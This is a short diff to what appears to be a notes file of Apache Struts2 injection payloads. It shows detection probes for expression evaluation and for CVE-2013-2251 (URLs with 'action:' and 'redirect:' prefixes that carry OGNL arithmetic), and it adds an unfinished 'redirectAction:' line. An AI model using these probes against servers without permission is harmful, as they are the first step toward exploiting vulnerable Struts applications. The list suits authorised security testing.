@@ -12,3 +12,4 @@ Payload format - http://localhost:8080/${3+2}/date.action - Results 5 in Respons
 CVE-2013-2251
 Payload - http://host/struts2-blank/example/X.action?action:%25{3*4}
           http://host/struts2-showcase/employee/save.action?redirect:%25{3*4}
+          http://host/struts2-showcase/employee/save.action?redirectAction:
